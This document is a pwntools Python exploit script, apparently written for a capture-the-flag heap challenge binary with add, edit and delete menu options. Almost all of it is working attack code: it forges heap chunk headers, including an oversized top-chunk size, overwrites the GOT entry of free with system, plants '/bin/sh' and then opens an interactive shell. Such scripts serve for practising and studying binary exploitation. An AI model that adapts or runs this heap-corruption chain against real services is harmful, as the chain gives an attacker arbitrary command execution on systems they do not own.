
'''
huan_attack_pwn
'''

import sys
from pwn import *
# from LibcSearcher import *
# from ctypes import *
context(arch='amd64', os='linux', log_level='debug')
# context(arch='i386' , os='linux', log_level='debug')
binary = './pwn'
libc = './libc.so.6'
# host, port = ":".split(":")

print(('\033[31;40mremote\033[0m: (y)\n'
    '\033[32;40mprocess\033[0m: (n)'))

if sys.argv[1] == 'y':
    r = remote(host, int(port))
else:
    r = process(binary)

# r = gdb.debug(binary)
# libc = cdll.LoadLibrary(libc)
libc = ELF(libc)
elf = ELF(binary)
# srand = libc.srand(libc.time(0)) #设置种子

default = 1
se      = lambda data                     : r.send(data)
sa      = lambda delim, data              : r.sendafter(delim, data)
sl      = lambda data                     : r.sendline(data)
sla     = lambda delim, data              : r.sendlineafter(delim, data)
rc      = lambda numb=4096                : r.recv(numb)
rl      = lambda time=default             : r.recvline(timeout=time)
ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
uu32    = lambda data                     : u32(data.ljust(4, b'\0'))
uu64    = lambda data                     : u64(data.ljust(8, b'\0'))
lic     = lambda data                     : uu64(ru(data)[-6:])
padding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)
lg      = lambda var_name                 : log.success(f"{var_name} ：0x{globals()[var_name]:x}")
prl     = lambda var_name                 : print(len(var_name))
debug   = lambda command=''               : gdb.attach(r,command)
it      = lambda                          : r.interactive()

def cmd(i):
    sleep(0.1)
    sla(b'your choice >\n',str(i))
 
 
# 1 0x10
# 2 0x80
# 3 0xA0000
def add(nb,content):
    cmd('1')
    ru(b'Add>>')
    sl(str(nb))
    ru(b'idx>>')
    se(content)
 
def edit(idx,content,content2):
    cmd('3')
    ru('Edt>>')
    sl(str(idx))
    ru('addr>>')
    se(content[:7])
    ru('content>>')
    se(content2[:47])
 
 
def dele(idx):
    cmd('2')
    ru('Del>>')
    sl(str(idx))

add(3,'0')
dele(0)
add(3,'1')
dele(1)
add(1,'2')
dele(2)

payload = flat({
    0x00:pack(0)+pack(0x00),
    0x10:pack(0)+pack(0x11),
    0x20:pack(0)+pack(1)
})
edit(2,pack(0x601350),payload)

add(3,'3')


payload = flat({
    0x00:pack(0)+pack(0x00),
    0x10:pack(0)+pack(0xa00001),
})
edit(2,b'/bin/sh',payload)
add(3,'4')


payload = flat({
    0x00:pack(0xfffffffffffffff0)+pack(0x00),
    0x10:pack(0)+pack(0xfffffffffffffff1),
})
edit(4,'4',payload)
debug()

add(13337,'5')

add(1,p64(elf.got['free']))

edit(0,p64(elf.plt['system']),padding(0x70))

dele(2)

it()